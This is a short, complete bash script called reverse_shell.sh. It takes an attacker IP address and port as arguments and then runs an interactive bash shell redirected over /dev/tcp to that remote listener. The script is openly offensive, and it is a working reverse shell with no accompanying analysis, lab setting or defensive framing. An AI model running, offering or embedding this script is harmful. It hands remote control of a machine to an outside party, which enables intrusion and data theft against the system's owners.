#!/bin/bash
# Usage: ./reverse_shell.sh <ATTACKER_IP> <ATTACKER_PORT>

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <ATTACKER_IP> <ATTACKER_PORT>"
    exit 1
fi

ATTACKER_IP=$1
ATTACKER_PORT=$2

# To connect back to the attacker listener
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
